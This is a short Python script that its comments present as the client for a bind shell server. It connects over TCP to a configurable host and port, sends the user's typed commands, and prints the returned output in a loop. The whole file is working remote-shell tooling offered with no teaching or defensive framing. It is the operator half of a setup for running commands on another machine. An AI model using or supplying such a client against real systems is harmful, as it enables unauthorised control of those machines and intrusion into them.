import socket

# Define the IP address and port of the bind shell server
HOST = '127.0.0.1'  # Change this to the IP address of the server
PORT = 4433

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Connect to the server
    s.connect((HOST, PORT))
    print(f"[*] Connected to {HOST}:{PORT}")

    # Loop to send commands and receive output
    while True:
        # Get the command from the user
        command = input("Enter command (or 'exit' to quit): ")

        # Send the command to the server
        s.send(command.encode())

        # Receive the output from the server
        output = s.recv(1024).decode()

        # Print the output
        print(output)

        # Check if the user wants to quit
        if command.strip() == 'exit':
            break

except ConnectionRefusedError:
    print(f"[*] Connection to {HOST}:{PORT} refused.")
finally:
    # Close the connection
    s.close()
